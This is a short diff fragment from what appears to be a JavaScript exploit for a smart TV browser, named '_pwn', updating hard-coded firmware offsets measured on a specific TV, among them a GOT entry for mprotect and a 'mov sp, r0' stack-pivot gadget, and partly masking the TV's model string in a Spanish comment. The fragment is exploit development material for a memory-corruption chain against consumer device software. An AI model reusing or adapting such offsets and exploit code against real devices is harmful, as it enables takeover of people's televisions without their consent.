@@ -72,7 +72,7 @@ window.runPayload_fn = async function _pwn() {
   function hx(n)  { return "0x" + (n >>> 0).toString(16); }
   function hx8(n) { let s = (n >>> 0).toString(16); while (s.length < 8) s = "0" + s; return "0x" + s; }
 
-  // ── Constantes medidas en ESTA TV (T-PTMDDEUC-0090-2130) ───────────────────
+  // ── Constantes medidas en ESTA TV (T-PTMxxxx-0090-2130) ───────────────────
   const ANCHOR_OFS      = 0x49a1cc0;   // was 0x49a2438
   const GOT_MPROTECT    = 0x526cfc4;   // was 0x526d748
   const PIVOT_OFS       = 0x1186088;   // was 0x1186288  (mov sp, r0)
